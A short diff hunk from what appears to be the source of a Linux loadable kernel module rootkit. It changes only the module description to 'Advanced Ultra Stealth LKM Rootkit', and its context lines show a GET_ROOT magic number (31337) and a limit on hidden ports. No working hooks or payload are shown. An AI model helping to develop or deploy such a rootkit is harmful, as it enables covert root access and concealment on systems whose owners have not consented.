@@ -37,7 +37,7 @@
 MODULE_LICENSE("GPL");
 MODULE_INFO(intree, "Y");
 MODULE_AUTHOR("Collaborative Merge");
-MODULE_DESCRIPTION("Integrated Rootkit: Fixed & Stabilized");
+MODULE_DESCRIPTION("Advanced Ultra Stealth LKM Rootkit");
 
 #define GET_ROOT 31337
 #define MAX_HIDDEN_PORTS 32
